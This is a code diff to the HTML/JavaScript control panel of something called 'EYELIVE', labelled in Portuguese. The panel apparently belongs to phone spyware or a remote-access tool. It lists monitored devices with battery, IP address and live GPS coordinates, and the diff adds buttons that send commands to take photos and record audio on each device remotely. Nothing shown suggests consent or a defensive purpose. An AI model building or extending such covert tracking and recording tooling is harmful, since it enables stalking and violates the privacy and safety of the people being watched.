@@ -11,5 +11,7 @@ h1{color:#ffd700;text-align:center;font-size:1.2em}
 </style></head>
 <body><h1>EYELIVE</h1><div id="d"></div>
 <script>
-function L(){fetch("/painel_data").then(r=>r.json()).then(d=>{var h="";d.forEach(function(x){h+='<div class=card><h3 class=green>ON - '+x.nome+'</h3><div class=data><p>Bateria: '+x.bateria+(x.carregando?' CARREGANDO':'')+' | '+x.ultimo_update+'</p><p>IP: '+x.ip+' | GPS: '+x.gps.lat+','+x.gps.lng+'</p></div></div>'});document.getElementById("d").innerHTML=h||"<p>Nenhum dispositivo</p>"})}setInterval(L,8000);L()
+function L(){fetch("/painel_data").then(function(r){return r.json()}).then(function(d){var h="";d.forEach(function(x){h+='<div class=card><h3 class=green>ON - '+x.nome+'</h3><div class=data><p>Bateria: '+x.bateria+(x.carregando?' CARREGANDO':'')+' | '+x.ultimo_update+'</p><p>IP: '+x.ip+' | GPS: '+x.gps.lat+','+x.gps.lng+'</p><button class=btn onclick="cmd(\''+x.id+'\',\'foto\')">Foto</button> <button class=btn onclick="cmd(\''+x.id+'\',\'audio\')">Audio</button></div></div>'});document.getElementById("d").innerHTML=h||"<p>Nenhum dispositivo</p>"})}
+function cmd(dev,cmd){fetch("/cmd?device="+dev+"&cmd="+cmd).then(function(r){return r.json()}).then(function(d){alert(d.msg||d.error||"OK")})}
+setInterval(L,8000);L()
 </script></body></html>
